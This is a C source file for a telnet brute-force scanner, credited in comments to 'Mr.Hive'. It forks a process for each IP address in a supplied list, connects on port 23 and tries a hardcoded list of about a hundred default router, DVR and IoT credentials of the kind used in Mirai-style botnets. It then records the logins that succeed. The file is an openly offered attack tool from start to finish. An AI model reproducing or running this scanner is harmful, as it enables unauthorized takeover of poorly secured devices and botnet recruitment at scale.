//SUDO_BRUTE.C WAS MADE BY MR.HIVE AKA ME NIBBA
//Date Made 10/25/2021
//SUB TO Kxng Zaxerty on YouTube
int Timeout;
int port = 23; // change if u want to use a this bruter for other devices or telnet on a diff port
int statement;
char buf[1024];
char combo[60];
char *combos[] = {
    "root:root",
			"admin:admin",
		"daemon:daemon",
		"root:vizxv",
		"root:pass",
		"root:anko",
			"root:",
			"admin:",
			"root:xc3511",
		"default:",
		"default:default",
		"supervisor:zyad1234",
		"root:5up",
		"default:lJwpbo6",
			"User:admin",
			"guest:12345",
		"guest:password",
		"root:zlxx.",
			"admin:1234",
			"admin:12345",
		"telnet:telnet",
		"admin:1234567",
			"admin:password",
		"root:88888888",
		"root:klv1234",
		"root:Zte521",
		"root:hi3518",
		"root:jvbzd",
		"root:7ujMko0vizxv",
		"root:7ujMko0admin",
		"root:ikwb",
		"root:dreambox",
		"root:user",
		"root:realtek",
		"root:00000000",
		"admin:1111111",
		"admin:54321",
		"admin:123456",
		"default:123456",
		"default:S2fGqNFs",
		"default:OxhlwSG8",
		"default:antslq",
		"default:tlJwpbo6",
		"root:default",
		"default:pass",
		"default:12345",
		"default:password",
		"root:taZz@23495859",
		"root:20080826",
		"admin:7ujMko0admin",
		"root:gforge",
		"root:zsun1188",
		"admin:synnet",
		"root:t0talc0ntr0l4!",
		"guest:1111",
		"root:admin1234",
		"root:tl789",
		"admin:fliradmin",
		"root:12345678",
		"root:1234567890",
		"root:vertex25ektks123",
		"root:admin@mymifi",
		"admin:7ujMko0admin",
		"admin:pass",
		"admin:meinsm",
		"admin:admin1234",
		"root:1111",
		"admin:1111",
		"root:666666",
		"root:klv123",
		"Administrator:admin",
		"service:service",
		"supervisor:supervisor",
		"guest:12345",
		"admin1:password",
		"administrator:1234",
		"666666:666666",
		"888888:888888",
		"tech:tech"
		"admin:dvr2580222",
		"ubnt:ubnt",
		"user:12345",
		"admin:aquario",
		"root:zsun1188",
		"default:lJwpbo6",
			"guest:guest",
			"user:user",
			"root:Zte521",
		"root:abc123",
		"root:admin",
		"root:xc3511",
		"root:Serv4EMC",
		"root:zsun1188",
		"root:123456",
			"default:OxhlwSG8",
			"default:S2fGqNFs",
		"admin:smcadmin"
		"admin:adslnadam",
			"sysadm:sysadm",
			"support:support",
			"root:default",
			"root:password",
			"adm:",
			"bin:",
			"daemon:",
			"root:cat1029",
			"admin:cat1029",
			"admin:123456",
			"root:antslq",
			"linux:linux",
			"admin:654321",
			"admin:87654321",
}; // MORE COMBOS = SLOWER SCANNER
 
#define combo_size (sizeof(combos) / sizeof(unsigned char *))
#define BRUTED "(\x1b[32m%s\x1b[37m:\x1b[32m%d\x1b[37m)"
#define FAIL "(\x1b[31m%s\x1b[37m:\x1b[31m%d\x1b[37m)"
#define INFO "(\x1b[33m%s\x1b[37m:\x1b[33m%d\x1b[37m)"
 
void Trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
 
void brute(char *target)
{
    int Read;
    int c = 0;
    int Socket;
    char cmd[70];
    statement = 0;
    char buffer[1024];
    struct sockaddr_in sock;
    struct timeval timeout;
    char *username;
    char password[40];
    char username2[25];
    char password2[44];
    s:
    switch(statement)
    {
        case 0:
        {
            if(c > combo_size)
                goto end;
            timeout.tv_sec = Timeout;
            timeout.tv_usec = 0;
            if(!(Socket = socket(AF_INET, SOCK_STREAM, 0)))
                return;
            setsockopt(Socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
            setsockopt(Socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
            sock.sin_family = AF_INET;
            sock.sin_port = htons(port);
            sock.sin_addr.s_addr = inet_addr(target);
            if(connect(Socket, (struct sockaddr *)&sock, sizeof(sock)) == -1)
            {
                statement = 0;
                goto end;
            }
            else
                printf(BRUTED" Connected!\n", target, port);
            statement += 1;
            goto s;
        }
        break;
       
        case 1:
        {
            snprintf(combo, sizeof(combo), "%s", combos[c]);
            if(combo == NULL || combo == " " || combo == "(null)")
                goto end;
            username = strtok(combo, ":");
            snprintf(password, sizeof(password), "%s", username+strlen(username)+1);
            snprintf(username2, sizeof(username2), "%s\r\n", username);
            snprintf(password2, sizeof(password2), "%s\r\n", password);
           
            printf(INFO" Trying Combo -> %s:%s\n", target, port, username, password);
            while(Read = read(Socket, buffer, 1024))
            {
                buffer[Read] = '\0';
                if(strstr(buffer, "ogin"))
                {
                    printf(BRUTED" Found login prompt!\n", target, port);
                    goto send_user;
                }
            }
            send_user:
            if(send(Socket, username2, strlen(username2), 0))
            {
                printf(BRUTED" Sent username %s!\n", target, port, username);
                while(Read = read(Socket, buffer, 1024))
                {
                    buffer[Read] = '\0';
                    if(strstr(buffer, "ailed") || strstr(buffer, "ncorrect") || strstr(buffer, "rong"))
                    {
                        printf(FAIL" Incorrect username...\n", target, port);
                        c += 1;
                        close(Socket);
                        statement = 0;
                        goto s;
                    }
                    else if(strstr(buffer, "@") || strstr(buffer, "#") || strstr(buffer, "$") || strstr(buffer, "%") || strstr(buffer, "elcome") || strstr(buffer, "usybox") || strstr(buffer, "usyBox") || strstr(buffer, ">") || strstr(buffer, "ONT"))
                    {
                        printf(BRUTED" HERES YOUR BRUTED LOGIN WITH NO PASSWORD -> %s\n", target, port, username);
                        snprintf(cmd, sizeof(cmd), "echo '%s:%d %s:%s' >> active_telnet", target, port, username, password); // too lazy to write to file
                        system(cmd);
                        goto end;
                    }
                    else if(strstr(buffer, "assword"))
                    {
                        printf(BRUTED" Found password prompt!\n", target, port);
                        goto send_pw;
                    }
                }
                send_pw:
                if(send(Socket, password2, strlen(password2), 0))
                {
                    printf(BRUTED" Sent password %s!\n", target, port, password);
                    while(Read = read(Socket, buffer, 1024))
                    {
                        buffer[Read] = '\0';
                        if(strstr(buffer, "ailed") || strstr(buffer, "ncorrect") || strstr(buffer, "rong"))
                        {
                            printf(FAIL" Incorrect credentials...\n", target, port);
                            c += 1;
                            close(Socket);
                            statement = 0;
                            goto s;
                        }
                        else if(strstr(buffer, "@") || strstr(buffer, "#") || strstr(buffer, "$") || strstr(buffer, "%") || strstr(buffer, "elcome") || strstr(buffer, "usybox") || strstr(buffer, "usyBox") || strstr(buffer, ">") || strstr(buffer, "ONT"))
                        {
                            printf(BRUTED" BRUTEDful login -> %s:%s\n", target, port, username, password);
                            snprintf(cmd, sizeof(cmd), "echo '%s:%d %s:%s' >> active_telnet", target, port, username, password); // too lazy to write to file
                            system(cmd);
                            goto end;
                        }
                    }
                }
            }
        }
        break;
    }
    end:
    c = 0;
    statement = 0;
    close(Socket);
    return;
}
 
int main(int argc, char **argv)
{
    if(argc < 3 || argc > 3)
    {
        printf("[\x1b[31m-\x1b[37m] Usage: %s <timeout> <list>\n", argv[0]);
        exit(0);
    }
    Timeout = atoi(argv[1]);
    FILE *vuln_list = fopen(argv[2], "r");
    if(vuln_list == NULL)
    {
        printf("[\x1b[31m-\x1b[37m] FAIL to open given list (\x1b[33m%s\x1b[37m)\n", argv[2]);
        exit(0);
    }
    while(fgets(buf, sizeof(buf) - 1, vuln_list))
    {
        if(strlen(buf) < 3 || buf == NULL)
            break;
        Trim(buf);
        if(!(fork()))
        {
            brute(buf);
            exit(0);
        }
    }
    return;
}
